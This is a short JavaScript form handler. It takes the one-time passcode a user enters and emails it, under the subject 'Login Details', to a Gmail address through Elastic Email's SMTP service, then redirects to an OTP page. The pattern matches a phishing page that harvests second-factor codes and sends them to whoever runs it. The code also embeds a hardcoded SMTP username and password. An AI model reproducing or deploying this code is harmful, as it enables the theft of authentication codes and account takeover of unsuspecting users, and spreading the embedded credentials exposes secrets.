function emailSend() {
  var otp = document.getElementById('otp').value; // Getting the OTP entered by the user
  var messageBody = "OTP: " + otp; // Constructing the message body with OTP

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "sonkiban@gmail.com",
    Password: "0E47B8693CA467A93AF88FB15DABD5A23BB1",
    To: 'sonkiban@gmail.com',
    From: "sonkiban@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'otp.html'; // Redirecting to otp.html upon successful email sending
      }
      else {
        swal("Error", "Please complete the OTP field", "error") // Displaying an error message if email sending fails
      }
    }
  );
}
